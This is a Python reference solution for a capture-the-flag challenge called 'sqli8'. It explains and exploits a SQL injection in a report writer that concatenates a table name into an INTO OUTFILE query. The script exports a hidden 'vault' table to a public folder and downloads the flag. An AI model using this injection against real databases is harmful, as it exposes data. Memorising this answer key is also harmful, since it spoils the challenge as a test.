#!/usr/bin/env python3
"""Reference solve for sqli8 (TransferOps Console) — out-of-band write.

The report writer runs:

    SELECT * FROM <table> WHERE <filter>
    INTO OUTFILE '/data/public/reports/<table>.csv'

with both <table> and <filter> concatenated from the request, and the app
serves /data/public/reports at /reports/<file>. The console only renders
transfers/routes/queues — but the writer will happily name any table in
appdb. The vault table holds the flag: ask the writer to export it, then
download the file it wrote.

Contract: discover the flag (never hard-code), print flag{...} to stdout,
retry the connection, take the target from BASE/argv.
"""
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8037"
FLAG_RE = re.compile(r"flag\{[^}]+\}")


def main() -> int:
    s = requests.Session()
    up = False
    for _ in range(60):  # MariaDB needs a few seconds to come up
        try:
            s.get(BASE, timeout=3)
            up = True
            break
        except requests.RequestException:
            time.sleep(2)
    if not up:
        sys.stderr.write(f"unreachable: {BASE}\n")
        return 1

    # Ask the writer to export the table the console never shows.
    r = s.get(BASE + "/report/vault", timeout=15)
    if r.status_code != 200 or "flash-error" in r.text:
        sys.stderr.write(f"export failed (HTTP {r.status_code})\n")
        return 1

    # The report file was written into the public reports folder.
    r = s.get(BASE + "/reports/vault.csv", timeout=15)
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag in report (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
